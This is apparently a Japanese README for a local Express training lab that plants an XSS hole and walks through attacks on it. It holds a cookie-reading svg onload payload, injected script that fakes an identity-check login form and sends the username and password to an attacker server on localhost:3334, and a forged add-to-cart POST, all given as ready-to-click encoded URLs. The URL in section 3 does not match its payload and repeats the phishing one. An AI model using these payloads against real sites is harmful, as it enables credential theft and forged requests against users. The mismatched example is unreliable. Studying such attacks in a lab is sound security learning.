# express-training

わざと XSS 脆弱性のあるページを作り、セッションハイジャックを試す。

## 1. XSS で document.cookie をコンソールに表示する

攻撃者が以下の html をクエリパラメータに仕込んで、攻撃対象にクリックさせる。

```html
<svg onload="console.log(document.cookie)">
```

URL はこうなる

```
http://localhost:3333/search?search=%3Csvg+onload%3D%22console.log%28document.cookie%29%22%3E
```

cookie に http-only 属性が付与されていたため、javascript から読むことはできなかった。


## 2. XSS でユーザー名とパスワードを入力させるフォームを作る

下記スクリプトを埋め込み、ユーザー名とパスワードを入力させて送信させる。
「送信」ボタンをクリックすると、攻撃者のサーバーにユーザー名とパスワードを送るようになっている。

```javascript
const div = document.createElement('div');

const p = document.createElement('p');
p.innerText = '本人確認のため、ユーザー名とパスワードを入力してください';
const userInput = document.createElement('input');
userInput.id = '_user';
const br = document.createElement('br');
const passInput = document.createElement('input');
passInput.type='password';
passInput.id = '_pass';
const button = document.createElement('button');
button.type = 'button';
button.id = '_submit';
button.innerText = '送信';

div.append(p, 'user: ', userInput, br, 'pass: ', passInput, br, button);
document.body.append(div);

document.getElementById('_submit').onclick = () => {
    console.log('send password...');
    const user = document.getElementById('_user').value;
    const pass = document.getElementById('_pass').value;
    fetch('http://localhost:3334?' + new URLSearchParams({user, pass}));
}
```

minify すると

```javascript
const div=document.createElement('div');const p=document.createElement('p');p.innerText='本人確認のため、ユーザー名とパスワードを入力してください';const userInput=document.createElement('input');userInput.id='_user';const br=document.createElement('br');const passInput=document.createElement('input');passInput.type='password';passInput.id='_pass';const button=document.createElement('button');button.type='button';button.id='_submit';button.innerText='送信';div.append(p,'user: ',userInput,br,'pass: ',passInput,br,button);document.body.append(div);document.getElementById('_submit').onclick=()=>{console.log('send password...');const user=document.getElementById('_user').value;const pass=document.getElementById('_pass').value;fetch('http://localhost:3334?'+new URLSearchParams({user,pass}))}
```

URL encode すると

```
%3Csvg+onload%3D%22const+div%3Ddocument.createElement%28%27div%27%29%3Bconst+p%3Ddocument.createElement%28%27p%27%29%3Bp.innerText%3D%27%E6%9C%AC%E4%BA%BA%E7%A2%BA%E8%AA%8D%E3%81%AE%E3%81%9F%E3%82%81%E3%80%81%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E5%90%8D%E3%81%A8%E3%83%91%E3%82%B9%E3%83%AF%E3%83%BC%E3%83%89%E3%82%92%E5%85%A5%E5%8A%9B%E3%81%97%E3%81%A6%E3%81%8F%E3%81%A0%E3%81%95%E3%81%84%27%3Bconst+userInput%3Ddocument.createElement%28%27input%27%29%3BuserInput.id%3D%27_user%27%3Bconst+br%3Ddocument.createElement%28%27br%27%29%3Bconst+passInput%3Ddocument.createElement%28%27input%27%29%3BpassInput.type%3D%27password%27%3BpassInput.id%3D%27_pass%27%3Bconst+button%3Ddocument.createElement%28%27button%27%29%3Bbutton.type%3D%27button%27%3Bbutton.id%3D%27_submit%27%3Bbutton.innerText%3D%27%E9%80%81%E4%BF%A1%27%3Bdiv.append%28p%2C%27user%3A+%27%2CuserInput%2Cbr%2C%27pass%3A+%27%2CpassInput%2Cbr%2Cbutton%29%3Bdocument.body.append%28div%29%3Bdocument.getElementById%28%27_submit%27%29.onclick%3D%28%29%3D%3E%7Bconsole.log%28%27send+password...%27%29%3Bconst+user%3Ddocument.getElementById%28%27_user%27%29.value%3Bconst+pass%3Ddocument.getElementById%28%27_pass%27%29.value%3Bfetch%28%27http%3A%2F%2Flocalhost%3A3334%3F%27%2Bnew+URLSearchParams%28%7Buser%2Cpass%7D%29%29%7D%22%3E
```

これを URL 化すると

```
http://localhost:3333/search?search=%3Csvg+onload%3D%22const+div%3Ddocument.createElement%28%27div%27%29%3Bconst+p%3Ddocument.createElement%28%27p%27%29%3Bp.innerText%3D%27%E6%9C%AC%E4%BA%BA%E7%A2%BA%E8%AA%8D%E3%81%AE%E3%81%9F%E3%82%81%E3%80%81%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E5%90%8D%E3%81%A8%E3%83%91%E3%82%B9%E3%83%AF%E3%83%BC%E3%83%89%E3%82%92%E5%85%A5%E5%8A%9B%E3%81%97%E3%81%A6%E3%81%8F%E3%81%A0%E3%81%95%E3%81%84%27%3Bconst+userInput%3Ddocument.createElement%28%27input%27%29%3BuserInput.id%3D%27_user%27%3Bconst+br%3Ddocument.createElement%28%27br%27%29%3Bconst+passInput%3Ddocument.createElement%28%27input%27%29%3BpassInput.type%3D%27password%27%3BpassInput.id%3D%27_pass%27%3Bconst+button%3Ddocument.createElement%28%27button%27%29%3Bbutton.type%3D%27button%27%3Bbutton.id%3D%27_submit%27%3Bbutton.innerText%3D%27%E9%80%81%E4%BF%A1%27%3Bdiv.append%28p%2C%27user%3A+%27%2CuserInput%2Cbr%2C%27pass%3A+%27%2CpassInput%2Cbr%2Cbutton%29%3Bdocument.body.append%28div%29%3Bdocument.getElementById%28%27_submit%27%29.onclick%3D%28%29%3D%3E%7Bconsole.log%28%27send+password...%27%29%3Bconst+user%3Ddocument.getElementById%28%27_user%27%29.value%3Bconst+pass%3Ddocument.getElementById%28%27_pass%27%29.value%3Bfetch%28%27http%3A%2F%2Flocalhost%3A3334%3F%27%2Bnew+URLSearchParams%28%7Buser%2Cpass%7D%29%29%7D%22%3E
```

これを攻撃対象にクリックさせる。


## 3. XSS で「レモンをカートに入れる」リクエストを投げさせる

攻撃者が以下の html をクエリパラメータに仕込んで、攻撃対象にクリックさせる。

```html
<svg onload="fetch('/add_to_cart',{method:'POST'})">
```

URL はこうなる

```
http://localhost:3333/search?search=%3Csvg+onLoad%3D%22const+form%3Ddocument.createElement%28%27form%27%29%3Bform.innerHTML%3D%27%3Cp%3E%E6%9C%AC%E4%BA%BA%E7%A2%BA%E8%AA%8D%E3%81%AE%E3%81%9F%E3%82%81%E3%80%81%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E5%90%8D%E3%81%A8%E3%83%91%E3%82%B9%E3%83%AF%E3%83%BC%E3%83%89%E3%82%92%E5%85%A5%E5%8A%9B%E3%81%97%E3%81%A6%E3%81%8F%E3%81%A0%E3%81%95%E3%81%84%3C%2Fp%3Euser%3A+%3Cinput+id%3D%22_user%22+name%3D%22user%22%3E%3Cbr%3Epass%3A+%3Cinput+id%3D%22_pass%22+name%3D%22pass%22%3E%3Cbr%3E%3Cbutton+id%3D%22_submit%22+type%3D%22button%22%3E%E9%80%81%E4%BF%A1%3C%2Fbutton%3E%27%3Bdocument.body.appendChild%28form%29%3Bdocument.getElementById%28%27_submit%27%29.onclick%3D%28%29%3D%3E%7Bconst+user%3Ddocument.getElementById%28%27_user%27%29.value%3Bconst+pass%3Ddocument.getElementById%28%27_pass%27%29.value%3Bfetch%28%27http%3A%2F%2Flocalhost%3A3334%3F%27%2Bnew+URLSearchParams%28%7Buser%2Cpass%7D%29%29%7D%22%3E
```

被攻撃者はこの URL をクリックし、検索結果ページに遷移するが、同時に埋め込まれたスクリプトで /add_to_cart に POST してしまう。
これにより、レモンが一つカートに追加されてしまう。
// TODO csrf トークンが設定されている場合は？
